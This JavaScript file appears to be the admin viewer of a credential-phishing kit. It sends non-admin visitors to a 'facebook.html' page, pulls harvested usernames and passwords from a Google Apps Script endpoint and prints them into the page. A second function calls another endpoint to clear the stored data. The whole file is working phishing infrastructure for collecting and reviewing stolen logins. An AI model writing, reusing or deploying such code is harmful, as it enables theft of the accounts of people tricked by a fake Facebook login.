let body = document.body;
if(sessionStorage.admin != 'online'){
    location.href = 'facebook.html';
}
function clear_data(){
    fetch('https://script.google.com/macros/s/AKfycbzbfYdi3Yhfoamq7CDxRJyUEv9US9p2obXR4PQj-twbtlTdZqVnh3IYEGRySoTBHzn7/exec').then(response => {
        if (response.ok) {
            location.reload();
        }
    })
}
let accounts = [];
fetch('https://script.google.com/macros/s/AKfycbxyxXHWtWEUahnCx6EMcU8JFpsdXCGiy_QH8r1idPrKadw4a22aVGdmrEp-a3fgeNdn/exec')
.then(res => res.json())
.then(data =>{
    accounts = data;
    for(let i = 0; i < accounts.length; i++){
        body.innerHTML += '<div><b class="title1">username:</b><pre class="user"> ' + accounts[i].user + '</pre><b class="title2">password:</b><pre class="pass"> ' + accounts[i].pass + '</pre></div>'
    }
})